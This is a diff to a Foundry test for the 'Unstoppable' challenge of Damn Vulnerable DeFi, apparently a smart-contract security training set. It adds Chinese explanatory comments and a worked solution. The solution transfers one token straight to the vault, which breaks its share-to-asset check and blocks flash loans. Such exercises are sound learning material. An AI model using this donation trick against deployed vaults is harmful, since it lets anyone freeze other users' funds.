@@ -10,6 +10,7 @@ import {UnstoppableMonitor} from "../../src/unstoppable/UnstoppableMonitor.sol";
 contract UnstoppableChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
+    address monitor = makeAddr("monitor");
 
     uint256 constant TOKENS_IN_VAULT = 1_000_000e18;
     uint256 constant INITIAL_PLAYER_TOKEN_BALANCE = 10e18;
@@ -32,13 +33,17 @@ contract UnstoppableChallenge is Test {
         startHoax(deployer);
         // Deploy token and vault
         token = new DamnValuableToken();
+        // token是 ERC4626 中支持的资产 DVT
         vault = new UnstoppableVault({_token: token, _owner: deployer, _feeRecipient: deployer});
 
         // Deposit tokens to vault
+        // 向 valut 注入 DVT 流动性 （TOKENS_IN_VAULT数量）
         token.approve(address(vault), TOKENS_IN_VAULT);
+        // 初次注入 DVT 数量与铸造份额 tDVT 数量相等
         vault.deposit(TOKENS_IN_VAULT, address(deployer));
 
         // Fund player's account with initial token balance
+        // 向用户提供 DVT (INITIAL_PLAYER_TOKEN_BALANCE数量)
         token.transfer(player, INITIAL_PLAYER_TOKEN_BALANCE);
 
         // Deploy monitor contract and grant it vault's ownership
@@ -47,7 +52,7 @@ contract UnstoppableChallenge is Test {
 
         // Monitor checks it's possible to take a flash loan
         vm.expectEmit();
-        emit UnstoppableMonitor.FlashLoanStatus(true);
+        emit UnstoppableMonitor.FlashLoanStatus(true); // 检查为正常
         monitorContract.checkFlashLoan(100e18);
 
         vm.stopPrank();
@@ -66,8 +71,11 @@ contract UnstoppableChallenge is Test {
 
         // Check vault properties
         assertEq(address(vault.asset()), address(token));
+        // vault合约持有的 DVT 数量
         assertEq(vault.totalAssets(), TOKENS_IN_VAULT);
+        // tDVT 数量
         assertEq(vault.totalSupply(), TOKENS_IN_VAULT);
+        // 池子里 DVT 总数
         assertEq(vault.maxFlashLoan(address(token)), TOKENS_IN_VAULT);
         assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT - 1), 0);
         assertEq(vault.flashFee(address(token), TOKENS_IN_VAULT), 50000e18);
@@ -91,7 +99,12 @@ contract UnstoppableChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_unstoppable() public checkSolvedByPlayer {
+        // player（修饰器中） 再向 vault 转 DVT 使其余额不相等
+        token.transfer(address(vault), 1);
         
+        console.log("totalSupply: ", vault.totalSupply());
+        console.log("totalAssets: ",  vault.totalAssets());
+        console.log("convert: ", vault.convertToShares(vault.totalSupply()));
     }
 
     /**
@@ -100,8 +113,11 @@ contract UnstoppableChallenge is Test {
     function _isSolved() private {
         // Flashloan check must fail
         vm.prank(deployer);
+        
+        // !!! 此处检测闪电贷状态不为false
         vm.expectEmit();
         emit UnstoppableMonitor.FlashLoanStatus(false);
+        // 此处执行vault.flashLoan看是否能执行成功
         monitorContract.checkFlashLoan(100e18);
 
         // And now the monitor paused the vault and transferred ownership to deployer
